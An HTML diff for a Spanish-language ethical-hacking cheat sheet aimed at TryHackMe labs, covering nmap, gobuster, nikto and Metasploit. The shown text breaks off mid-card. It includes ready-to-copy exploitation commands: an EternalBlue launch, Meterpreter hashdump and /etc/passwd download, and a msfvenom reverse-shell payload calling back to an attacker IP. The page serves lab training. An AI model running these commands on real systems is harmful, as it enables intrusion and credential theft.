@@ -1,0 +1,1298 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HackSheet — Ethical Hacking Cheat Sheet</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+  :root {
+    --bg:       #050a05;
+    --surface:  #0b120b;
+    --card:     #0d1a0d;
+    --border:   #1a3a1a;
+    --green:    #00ff41;
+    --green2:   #00c832;
+    --green3:   #007a1e;
+    --blue:     #00d4ff;
+    --dim:      #4a7a4a;
+    --text:     #c8e6c8;
+    --muted:    #5a7a5a;
+    --red:      #ff4141;
+    --yellow:   #ffd700;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 16px;
+    line-height: 1.6;
+    overflow-x: hidden;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,255,65,0.015) 2px,
+      rgba(0,255,65,0.015) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* Matrix rain canvas */
+  #matrix-bg {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    opacity: 0.04;
+    z-index: 0;
+    pointer-events: none;
+  }
+
+  .content { position: relative; z-index: 1; }
+
+  /* HEADER */
+  header {
+    border-bottom: 1px solid var(--border);
+    background: linear-gradient(180deg, rgba(0,255,65,0.05) 0%, transparent 100%);
+    padding: 2rem 1.5rem 1.5rem;
+    text-align: center;
+    position: relative;
+  }
+
+  .logo {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(2rem, 6vw, 4rem);
+    font-weight: 900;
+    color: var(--green);
+    text-shadow:
+      0 0 10px var(--green),
+      0 0 30px rgba(0,255,65,0.5),
+      0 0 60px rgba(0,255,65,0.2);
+    letter-spacing: 0.05em;
+    animation: flicker 8s infinite;
+  }
+
+  @keyframes flicker {
+    0%,95%,97%,100% { opacity: 1; }
+    96% { opacity: 0.7; }
+  }
+
+  .subtitle {
+    font-family: 'Share Tech Mono', monospace;
+    color: var(--blue);
+    font-size: 0.85rem;
+    letter-spacing: 0.3em;
+    text-transform: uppercase;
+    margin-top: 0.5rem;
+    opacity: 0.8;
+  }
+
+  .badge {
+    display: inline-block;
+    background: rgba(0,255,65,0.1);
+    border: 1px solid var(--green3);
+    color: var(--green2);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.7rem;
+    padding: 0.2rem 0.7rem;
+    border-radius: 2px;
+    margin: 0.3rem 0.2rem;
+    letter-spacing: 0.1em;
+  }
+
+  /* NAV TABS */
+  nav {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.5rem;
+    padding: 1.2rem 1.5rem;
+    border-bottom: 1px solid var(--border);
+    background: rgba(0,0,0,0.4);
+    justify-content: center;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    backdrop-filter: blur(10px);
+  }
+
+  .nav-btn {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.75rem;
+    padding: 0.4rem 1rem;
+    border: 1px solid var(--border);
+    background: transparent;
+    color: var(--dim);
+    cursor: pointer;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    transition: all 0.2s;
+    border-radius: 2px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .nav-btn::before {
+    content: '';
+    position: absolute;
+    left: 0; top: 0; bottom: 0;
+    width: 0;
+    background: rgba(0,255,65,0.08);
+    transition: width 0.2s;
+  }
+
+  .nav-btn:hover::before, .nav-btn.active::before { width: 100%; }
+
+  .nav-btn:hover, .nav-btn.active {
+    color: var(--green);
+    border-color: var(--green3);
+    text-shadow: 0 0 8px rgba(0,255,65,0.5);
+  }
+
+  /* MAIN LAYOUT */
+  main {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 2rem 1.5rem;
+  }
+
+  /* SECTION */
+  .section {
+    display: none;
+    animation: fadeIn 0.3s ease;
+  }
+  .section.active { display: block; }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(8px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    margin-bottom: 2rem;
+    padding-bottom: 1rem;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-icon {
+    font-size: 1.8rem;
+    filter: drop-shadow(0 0 8px currentColor);
+  }
+
+  .section-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 1.3rem;
+    color: var(--green);
+    text-shadow: 0 0 15px rgba(0,255,65,0.4);
+    letter-spacing: 0.1em;
+  }
+
+  .section-desc {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.75rem;
+    color: var(--muted);
+    margin-top: 0.2rem;
+  }
+
+  /* CARDS GRID */
+  .cards-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+    gap: 1rem;
+  }
+
+  /* COMMAND CARD */
+  .cmd-card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    overflow: hidden;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    position: relative;
+  }
+
+  .cmd-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, var(--green3), transparent);
+    opacity: 0;
+    transition: opacity 0.3s;
+  }
+
+  .cmd-card:hover {
+    border-color: var(--green3);
+    box-shadow: 0 0 20px rgba(0,255,65,0.06), inset 0 0 20px rgba(0,255,65,0.02);
+  }
+
+  .cmd-card:hover::before { opacity: 1; }
+
+  .card-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0.75rem 1rem;
+    background: rgba(0,255,65,0.04);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .card-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 0.7rem;
+    color: var(--green2);
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+  }
+
+  .risk-badge {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.6rem;
+    padding: 0.15rem 0.5rem;
+    border-radius: 2px;
+    letter-spacing: 0.1em;
+  }
+  .risk-low  { background: rgba(0,200,50,0.15);  color: var(--green2); border: 1px solid var(--green3); }
+  .risk-med  { background: rgba(255,215,0,0.1);  color: var(--yellow); border: 1px solid rgba(255,215,0,0.3); }
+  .risk-high { background: rgba(255,65,65,0.1);  color: var(--red);    border: 1px solid rgba(255,65,65,0.3); }
+
+  /* CODE BLOCK */
+  .code-block {
+    background: #000;
+    padding: 0.9rem 1rem;
+    position: relative;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-block pre {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.82rem;
+    color: var(--green);
+    white-space: pre-wrap;
+    word-break: break-all;
+    line-height: 1.5;
+  }
+
+  .code-block pre .prompt {
+    color: var(--green3);
+    user-select: none;
+  }
+
+  .copy-btn {
+    position: absolute;
+    top: 0.6rem;
+    right: 0.6rem;
+    background: rgba(0,255,65,0.08);
+    border: 1px solid var(--green3);
+    color: var(--green2);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.65rem;
+    padding: 0.25rem 0.6rem;
+    cursor: pointer;
+    border-radius: 2px;
+    letter-spacing: 0.1em;
+    transition: all 0.2s;
+    display: flex;
+    align-items: center;
+    gap: 0.3rem;
+  }
+
+  .copy-btn:hover {
+    background: rgba(0,255,65,0.18);
+    box-shadow: 0 0 10px rgba(0,255,65,0.2);
+  }
+
+  .copy-btn.copied {
+    background: rgba(0,200,50,0.2);
+    color: var(--green);
+    border-color: var(--green2);
+  }
+
+  /* EXPLANATION */
+  .card-explanation {
+    padding: 0.8rem 1rem;
+  }
+
+  .explanation-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.6rem;
+    color: var(--muted);
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    margin-bottom: 0.3rem;
+    display: flex;
+    align-items: center;
+    gap: 0.4rem;
+  }
+
+  .explanation-label::before {
+    content: '▶';
+    color: var(--green3);
+    font-size: 0.5rem;
+  }
+
+  .explanation-text {
+    font-size: 0.88rem;
+    color: #8aaa8a;
+    line-height: 1.5;
+  }
+
+  /* TAGS */
+  .card-tags {
+    padding: 0.5rem 1rem 0.8rem;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.3rem;
+  }
+
+  .tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.6rem;
+    padding: 0.1rem 0.4rem;
+    border-radius: 2px;
+    background: rgba(0,212,255,0.07);
+    border: 1px solid rgba(0,212,255,0.2);
+    color: rgba(0,212,255,0.7);
+    letter-spacing: 0.05em;
+  }
+
+  /* SUBSECTION */
+  .subsection-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.75rem;
+    color: var(--blue);
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    margin: 1.5rem 0 1rem;
+    padding-left: 0.8rem;
+    border-left: 2px solid var(--blue);
+    opacity: 0.9;
+  }
+
+  /* TOAST */
+  #toast {
+    position: fixed;
+    bottom: 2rem;
+    right: 2rem;
+    background: var(--card);
+    border: 1px solid var(--green2);
+    color: var(--green);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.75rem;
+    padding: 0.6rem 1.2rem;
+    border-radius: 3px;
+    box-shadow: 0 0 20px rgba(0,255,65,0.3);
+    transform: translateY(100px);
+    opacity: 0;
+    transition: all 0.3s;
+    z-index: 9998;
+    letter-spacing: 0.1em;
+  }
+
+  #toast.show {
+    transform: translateY(0);
+    opacity: 1;
+  }
+
+  /* FOOTER */
+  footer {
+    text-align: center;
+    padding: 2rem;
+    border-top: 1px solid var(--border);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.7rem;
+    color: var(--muted);
+    letter-spacing: 0.1em;
+    margin-top: 3rem;
+  }
+
+  footer span { color: var(--green3); }
+
+  /* DISCLAIMER */
+  .disclaimer {
+    background: rgba(255,65,65,0.06);
+    border: 1px solid rgba(255,65,65,0.2);
+    border-radius: 3px;
+    padding: 1rem 1.2rem;
+    margin-bottom: 2rem;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.72rem;
+    color: rgba(255,100,100,0.8);
+    line-height: 1.6;
+  }
+
+  .disclaimer strong {
+    color: var(--red);
+    display: block;
+    margin-bottom: 0.3rem;
+    font-size: 0.8rem;
+  }
+
+  /* SCROLLBAR */
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--green3); border-radius: 3px; }
+
+  /* MOBILE */
+  @media (max-width: 640px) {
+    .cards-grid { grid-template-columns: 1fr; }
+    .logo { font-size: 1.8rem; }
+    nav { gap: 0.3rem; padding: 0.8rem; }
+    .nav-btn { font-size: 0.65rem; padding: 0.3rem 0.7rem; }
+  }
+
+  /* Highlight spans in code */
+  .hl-flag  { color: #00d4ff; }
+  .hl-host  { color: #ffd700; }
+  .hl-opt   { color: #ff9d00; }
+  .hl-str   { color: #ff79c6; }
+</style>
+</head>
+<body>
+
+<canvas id="matrix-bg"></canvas>
+
+<div class="content">
+
+<!-- HEADER -->
+<header>
+  <div class="logo">HACK<span style="color:var(--blue)">SHEET</span></div>
+  <div class="subtitle">// Ethical Hacking Quick Reference — TryHackMe Edition</div>
+  <div style="margin-top:0.8rem;">
+    <span class="badge">⚡ RECON</span>
+    <span class="badge">🌐 WEB ENUM</span>
+    <span class="badge">💥 EXPLOIT</span>
+    <span class="badge">🔑 PRIVESC</span>
+    <span class="badge">📦 FILE TRANSFER</span>
+  </div>
+</header>
+
+<!-- NAV -->
+<nav id="main-nav">
+  <button class="nav-btn active" onclick="showSection('recon', this)">⟩ Reconocimiento</button>
+  <button class="nav-btn" onclick="showSection('webenum', this)">⟩ Enumeración Web</button>
+  <button class="nav-btn" onclick="showSection('exploit', this)">⟩ Explotación</button>
+  <button class="nav-btn" onclick="showSection('privesc', this)">⟩ Privilege Escalation</button>
+  <button class="nav-btn" onclick="showSection('filetransfer', this)">⟩ Transferencia Archivos</button>
+</nav>
+
+<main>
+
+<!-- DISCLAIMER -->
+<div class="disclaimer">
+  <strong>⚠ AVISO LEGAL — USO ÉTICO ÚNICAMENTE</strong>
+  Los comandos de esta cheat sheet son exclusivamente para entornos de práctica autorizados (TryHackMe, HackTheBox, laboratorios propios). El uso no autorizado en sistemas ajenos es ilegal. Actúa siempre con responsabilidad ética.
+</div>
+
+<!-- ═══════════════ RECONOCIMIENTO ═══════════════ -->
+<section class="section active" id="recon">
+  <div class="section-header">
+    <span class="section-icon" style="color:#00ff41">🎯</span>
+    <div>
+      <div class="section-title">RECONOCIMIENTO</div>
+      <div class="section-desc">// Fase inicial: descubrir qué hay en el objetivo</div>
+    </div>
+  </div>
+
+  <div class="subsection-title">NMAP — Network Mapper</div>
+  <div class="cards-grid">
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Ping Scan (Host Discovery)</span>
+        <span class="risk-badge risk-low">PASIVO</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>nmap <span class="hl-flag">-sn</span> <span class="hl-host">192.168.1.0/24</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'nmap -sn 192.168.1.0/24')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Envía pings a toda una red para descubrir qué hosts (máquinas) están encendidos y responden. NO escanea puertos aún — solo comprueba quién existe en la red.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">discovery</span><span class="tag">ping</span><span class="tag">red-local</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Escaneo de Puertos Básico</span>
+        <span class="risk-badge risk-low">BÁSICO</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>nmap <span class="hl-flag">-sV</span> <span class="hl-flag">-sC</span> <span class="hl-flag">-p-</span> <span class="hl-host">10.10.10.1</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'nmap -sV -sC -p- 10.10.10.1')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text"><b style="color:var(--blue)">-sV</b> detecta qué software y versión corre en cada puerto. <b style="color:var(--blue)">-sC</b> ejecuta scripts automáticos de detección. <b style="color:var(--blue)">-p-</b> escanea los 65535 puertos (no solo los 1000 más comunes).</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">ports</span><span class="tag">versiones</span><span class="tag">completo</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Escaneo Agresivo (T4)</span>
+        <span class="risk-badge risk-med">AGRESIVO</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>nmap <span class="hl-flag">-A</span> <span class="hl-flag">-T4</span> <span class="hl-flag">-p</span> <span class="hl-opt">22,80,443</span> <span class="hl-host">10.10.10.1</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'nmap -A -T4 -p 22,80,443 10.10.10.1')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text"><b style="color:var(--blue)">-A</b> activa detección de OS, versiones, scripts y traceroute todo a la vez. <b style="color:var(--blue)">-T4</b> lo hace a máxima velocidad (puede disparar alertas IDS).</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">agresivo</span><span class="tag">os-detection</span><span class="tag">rápido</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Escaneo Stealth (SYN)</span>
+        <span class="risk-badge risk-low">SILENCIOSO</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>nmap <span class="hl-flag">-sS</span> <span class="hl-flag">-T2</span> <span class="hl-flag">-O</span> <span class="hl-host">10.10.10.1</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'nmap -sS -T2 -O 10.10.10.1')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text"><b style="color:var(--blue)">-sS</b> hace un "half-open scan": abre conexiones TCP sin completarlas, siendo más difícil de detectar. <b style="color:var(--blue)">-T2</b> va más lento para evadir detección. <b style="color:var(--blue)">-O</b> intenta adivinar el sistema operativo.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">stealth</span><span class="tag">syn-scan</span><span class="tag">evasión</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Guardar Resultados</span>
+        <span class="risk-badge risk-low">ÚTIL</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>nmap <span class="hl-flag">-sV</span> <span class="hl-host">10.10.10.1</span> <span class="hl-flag">-oN</span> <span class="hl-str">resultado.txt</span>
+<span class="prompt">$ </span>nmap <span class="hl-flag">-sV</span> <span class="hl-host">10.10.10.1</span> <span class="hl-flag">-oX</span> <span class="hl-str">resultado.xml</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'nmap -sV 10.10.10.1 -oN resultado.txt')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Guarda el resultado del escaneo en un archivo. <b style="color:var(--blue)">-oN</b> en formato legible por humanos, <b style="color:var(--blue)">-oX</b> en XML (útil para importar a otras herramientas como Metasploit).</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">output</span><span class="tag">reportes</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Script de Vulnerabilidades</span>
+        <span class="risk-badge risk-high">INTRUSIVO</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>nmap <span class="hl-flag">--script vuln</span> <span class="hl-host">10.10.10.1</span>
+<span class="prompt">$ </span>nmap <span class="hl-flag">--script</span> <span class="hl-str">http-sql-injection</span> <span class="hl-host">10.10.10.1</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'nmap --script vuln 10.10.10.1')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Ejecuta la librería NSE (Nmap Scripting Engine) con scripts de detección de vulnerabilidades conocidas. Puede detectar EternalBlue, Heartbleed, SQLi y más de forma automática.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">NSE</span><span class="tag">vulnscript</span><span class="tag">cve</span>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- ═══════════════ ENUMERACIÓN WEB ═══════════════ -->
+<section class="section" id="webenum">
+  <div class="section-header">
+    <span class="section-icon" style="color:#00d4ff">🌐</span>
+    <div>
+      <div class="section-title" style="color:var(--blue)">ENUMERACIÓN WEB</div>
+      <div class="section-desc">// Descubrir rutas ocultas, archivos y vulnerabilidades web</div>
+    </div>
+  </div>
+
+  <div class="subsection-title">GOBUSTER — Directory Brute Force</div>
+  <div class="cards-grid">
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Gobuster — Directorios Básico</span>
+        <span class="risk-badge risk-med">ENUMERACIÓN</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>gobuster dir <span class="hl-flag">-u</span> <span class="hl-str">http://10.10.10.1</span> <span class="hl-flag">-w</span> <span class="hl-opt">/usr/share/wordlists/dirb/common.txt</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Prueba miles de nombres de directorios y archivos en el servidor web usando una "wordlist". Si el servidor responde con código 200, ese directorio existe. Busca cosas como <b style="color:var(--blue)">/admin</b>, <b style="color:var(--blue)">/backup</b>, <b style="color:var(--blue)">/login</b>.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">fuzzing</span><span class="tag">directorios</span><span class="tag">wordlist</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Gobuster — Con Extensiones</span>
+        <span class="risk-badge risk-med">ARCHIVOS</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>gobuster dir <span class="hl-flag">-u</span> <span class="hl-str">http://10.10.10.1</span> \
+  <span class="hl-flag">-w</span> <span class="hl-opt">/usr/share/wordlists/dirbuster/medium.txt</span> \
+  <span class="hl-flag">-x</span> <span class="hl-str">php,txt,html,bak</span> <span class="hl-flag">-t</span> <span class="hl-opt">50</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirbuster/medium.txt -x php,txt,html,bak -t 50')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text"><b style="color:var(--blue)">-x</b> añade extensiones para buscar archivos específicos (busca admin.php, login.txt, config.bak...). <b style="color:var(--blue)">-t 50</b> usa 50 hilos paralelos para ir más rápido.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">extensiones</span><span class="tag">archivos</span><span class="tag">multi-thread</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Gobuster — Subdominios (DNS)</span>
+        <span class="risk-badge risk-med">DNS</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>gobuster dns <span class="hl-flag">-d</span> <span class="hl-str">example.com</span> \
+  <span class="hl-flag">-w</span> <span class="hl-opt">/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Busca subdominios ocultos del objetivo (api.example.com, dev.example.com, staging.example.com...). A veces los subdominios tienen acceso a recursos internos o paneles de administración.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">DNS</span><span class="tag">subdominios</span><span class="tag">SecLists</span>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="subsection-title">NIKTO — Escáner de Vulnerabilidades Web</div>
+  <div class="cards-grid">
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Nikto — Escaneo Básico</span>
+        <span class="risk-badge risk-high">INTRUSIVO</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>nikto <span class="hl-flag">-h</span> <span class="hl-str">http://10.10.10.1</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'nikto -h http://10.10.10.1')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Analiza el servidor web en busca de más de 6700 vulnerabilidades conocidas: archivos peligrosos expuestos, configuraciones incorrectas, versiones de software vulnerables, cabeceras de seguridad faltantes y mucho más.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">vulns</span><span class="tag">headers</span><span class="tag">misconfig</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Nikto — Con Puerto y SSL</span>
+        <span class="risk-badge risk-high">INTRUSIVO</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>nikto <span class="hl-flag">-h</span> <span class="hl-str">https://10.10.10.1</span> <span class="hl-flag">-p</span> <span class="hl-opt">8443</span> <span class="hl-flag">-ssl</span>
+<span class="prompt">$ </span>nikto <span class="hl-flag">-h</span> <span class="hl-str">http://10.10.10.1</span> <span class="hl-flag">-o</span> <span class="hl-str">nikto_output.html</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'nikto -h https://10.10.10.1 -p 8443 -ssl')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text"><b style="color:var(--blue)">-p</b> especifica un puerto no estándar. <b style="color:var(--blue)">-ssl</b> fuerza HTTPS. <b style="color:var(--blue)">-o</b> guarda el resultado en un reporte HTML muy legible. Ideal para documentar findings.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">SSL</span><span class="tag">reporte</span><span class="tag">puerto-custom</span>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- ═══════════════ EXPLOTACIÓN ═══════════════ -->
+<section class="section" id="exploit">
+  <div class="section-header">
+    <span class="section-icon" style="color:#ff4141">💥</span>
+    <div>
+      <div class="section-title" style="color:var(--red)">EXPLOTACIÓN</div>
+      <div class="section-desc">// Solo en entornos de práctica autorizados</div>
+    </div>
+  </div>
+
+  <div class="subsection-title">METASPLOIT FRAMEWORK</div>
+  <div class="cards-grid">
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Iniciar Metasploit</span>
+        <span class="risk-badge risk-low">SETUP</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>msfconsole
+<span class="prompt">msf6 > </span>search <span class="hl-str">eternalblue</span>
+<span class="prompt">msf6 > </span>use <span class="hl-opt">0</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'msfconsole')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Lanza la consola de Metasploit. <b style="color:var(--blue)">search</b> busca exploits por nombre o CVE. <b style="color:var(--blue)">use 0</b> selecciona el primer resultado de la búsqueda. Piensa en Metasploit como una "navaja suiza" de exploits ya listos.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">MSF</span><span class="tag">framework</span><span class="tag">inicio</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Configurar y Lanzar Exploit</span>
+        <span class="risk-badge risk-high">EXPLOIT</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">msf6 > </span>show options
+<span class="prompt">msf6 > </span>set RHOSTS <span class="hl-host">10.10.10.1</span>
+<span class="prompt">msf6 > </span>set LHOST <span class="hl-host">10.9.0.1</span>
+<span class="prompt">msf6 > </span>set LPORT <span class="hl-opt">4444</span>
+<span class="prompt">msf6 > </span>run</pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'set RHOSTS 10.10.10.1\nset LHOST 10.9.0.1\nset LPORT 4444\nrun')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text"><b style="color:var(--blue)">RHOSTS</b> = IP del objetivo (victim). <b style="color:var(--blue)">LHOST</b> = tu IP (atacante). <b style="color:var(--blue)">LPORT</b> = puerto donde escucharás. <b style="color:var(--blue)">run</b> lanza el exploit. Cuando funciona, obtienes una sesión shell o Meterpreter.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">RHOSTS</span><span class="tag">LHOST</span><span class="tag">payload</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Meterpreter — Comandos Clave</span>
+        <span class="risk-badge risk-high">POST-EXPLOIT</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">meterpreter > </span>sysinfo
+<span class="prompt">meterpreter > </span>getuid
+<span class="prompt">meterpreter > </span>shell
+<span class="prompt">meterpreter > </span>download <span class="hl-str">/etc/passwd</span>
+<span class="prompt">meterpreter > </span>hashdump</pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'sysinfo\ngetuid\nshell\ndownload /etc/passwd\nhashdump')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text"><b style="color:var(--blue)">sysinfo</b>: info del sistema. <b style="color:var(--blue)">getuid</b>: qué usuario eres. <b style="color:var(--blue)">shell</b>: obtén una cmd/bash. <b style="color:var(--blue)">download</b>: descarga archivo del objetivo. <b style="color:var(--blue)">hashdump</b>: vuelca hashes de contraseñas (Windows).</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">meterpreter</span><span class="tag">post-exploit</span><span class="tag">pivoting</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Generar Payload con msfvenom</span>
+        <span class="risk-badge risk-high">PAYLOAD</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>msfvenom <span class="hl-flag">-p</span> <span class="hl-str">linux/x86/meterpreter/reverse_tcp</span> \
+  <span class="hl-opt">LHOST=10.9.0.1</span> <span class="hl-opt">LPORT=4444</span> \
+  <span class="hl-flag">-f</span> <span class="hl-str">elf</span> <span class="hl-flag">-o</span> <span class="hl-str">payload.elf</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.9.0.1 LPORT=4444 -f elf -o payload.elf')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
